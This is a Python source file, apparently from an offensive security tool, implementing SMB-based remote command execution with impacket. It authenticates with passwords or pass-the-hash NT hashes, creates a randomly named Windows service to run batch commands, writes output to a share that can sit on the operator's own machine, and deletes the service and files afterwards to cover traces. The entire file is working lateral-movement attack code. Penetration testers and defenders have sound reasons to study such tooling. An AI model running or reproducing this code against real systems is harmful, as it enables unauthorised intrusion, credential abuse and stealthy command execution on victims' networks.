import os
from time import sleep
from impacket.smbconnection import *
from impacket.dcerpc.v5 import transport, scmr

from ar3.helpers.misc import gen_random_string, get_local_ip


class SMBEXEC():
    def __init__(self, logger, host, args, smb_con, port=445, share_name=False):

        self.logger         = logger
        self.outfile        = gen_random_string()
        self.batchFile      = gen_random_string() + '.bat'
        self.__serviceName  = gen_random_string()
        self.__rpctransport = None
        self.__scmr         = None
        self.__conn         = None
        self.__shell        = '%COMSPEC% /Q /c '
        # self.__mode       = mode
        # self.__aesKey     = aesKey
        # self.__doKerberos = doKerberos

        # Auth
        self.smbcon     = smb_con
        self.host       = host
        self.port       = port
        self.username   = args.user
        self.password   = args.passwd
        self.domain     = args.domain
        self.hash       = args.hash
        self.lmhash     = ''
        self.nthash     = ''
        self.timeout    = args.timeout

        self.debug           = args.debug
        self.noOutput        = args.no_output
        self.fileless_output = False

        if share_name:
            # Fileless output
            self.fileless_output = True
            self.ip              = get_local_ip()
            self.share           = share_name
            self.path            = "\\"
        else:
            # Filed or Remote output
            self.ip     = args.exec_ip
            self.share  = args.exec_share
            self.path   = args.exec_path


        if self.hash:
            try:
                self.lmhash, self.nthash = self.hash.split(':')
            except:
                self.nthash = self.hash

        stringbinding = 'ncacn_np:{}[\pipe\svcctl]'.format(self.host)
        self.logger.debug('StringBinding {}'.format(stringbinding))
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.port)

        if hasattr(self.__rpctransport, 'setRemoteHost'):
            self.__rpctransport.setRemoteHost(self.host)
        if hasattr(self.__rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)
        #rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__scmr = self.__rpctransport.get_dce_rpc()
        self.__scmr.connect()
        s = self.__rpctransport.get_smb_connection()
        # We don't wanna deal with timeouts from now on.
        s.setTimeout(self.timeout)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']

    def execute(self, command):
        # Init New Command
        self.__outputBuffer = ''
        if self.noOutput:
            cmd = self.__shell + command
        else:
            cmd = self.__shell + command + " ^> \\\\{}\\{}{} 2>&1".format(self.ip, self.share, self.path + self.outfile)
        self.logger.debug("SMBexec: {}".format(cmd))

        # Write cmd to Service File for exec
        self.logger.debug("Creating {} to execute command".format(self.batchFile))
        if self.fileless_output:
            # Create bat service on AR3 server share
            with open(os.path.join('/tmp', '.ar3', self.batchFile), 'w') as batch_file:
                batch_file.write(cmd)
        else:
            # Create .bat service on target system in /Windows/Temp to execute command
            tid = self.smbcon.con.connectTree(self.share)
            fid = self.smbcon.con.createFile(tid, "{}{}".format(self.path.replace('\\', '/'), self.batchFile))
            self.smbcon.con.writeFile(tid, fid, cmd)
            self.smbcon.con.closeFile(tid, fid)

        # Create new CMD to execute .bat
        service_command = self.__shell + '\\\\{}\\{}{}{}'.format(self.ip, self.share, self.path, self.batchFile)
        self.logger.debug('Executing: ' + service_command)

        # Create Service
        self.logger.debug('Remote service {} created.'.format(self.__serviceName))
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=service_command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        # Start Service
        try:
            self.logger.debug('Remote service {} started.'.format(self.__serviceName))
            scmr.hRStartServiceW(self.__scmr, service)
        except Exception as e:
            pass
            #self._outputBuffer += str(e)

        # Delete Service
        self.logger.debug('Remote service {} deleted.'.format(self.__serviceName))
        scmr.hRDeleteService(self.__scmr, service,)
        scmr.hRCloseServiceHandle(self.__scmr, service)

        # Get output
        if self.noOutput:
            self.__outputBuffer = "Command executed with no output"
        elif self.fileless_output:
            self.get_output_fileless()
        else:
            self.get_output()
            self.cleanup()

        # Cleanup and return data
        self.finish()
        return self.__outputBuffer

    def get_output(self, CODEC='UTF-8'):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        while True:
            try:
                self.smbcon.con.getFile(self.share, "{}{}".format(self.path, self.outfile), output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    sleep(1)

                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    self.logger.debug('Connection broken, trying to recreate it')
                    self.smbcon.con.reconnect()
                    return self.get_output()

    def get_output_fileless(self):
        def output_callback_fileless(data):
            self.__outputBuffer += data
        while True:
            try:
                with open(os.path.join('/tmp', '.ar3', self.outfile), 'r') as output:
                    output_callback_fileless(output.read())
                break
            except IOError:
                sleep(2)

    def cleanup(self):
        try:
            self.smbcon.con.deleteFile(self.share, "{}{}".format(self.path.replace('\\', '/'), self.outfile))
            self.logger.debug('Deleted output file: \\\\{}\\{}{}'.format(self.ip, self.share, self.path + self.outfile))
        except:
            pass

        try:
            self.smbcon.con.deleteFile(self.share, "{}{}".format(self.path.replace('\\', '/'), self.batchFile))
            self.logger.debug('Deleted batch file: \\\\{}\\{}{}'.format(self.ip, self.share, self.path + self.batchFile))
        except:
            pass

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpctransport.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
            pass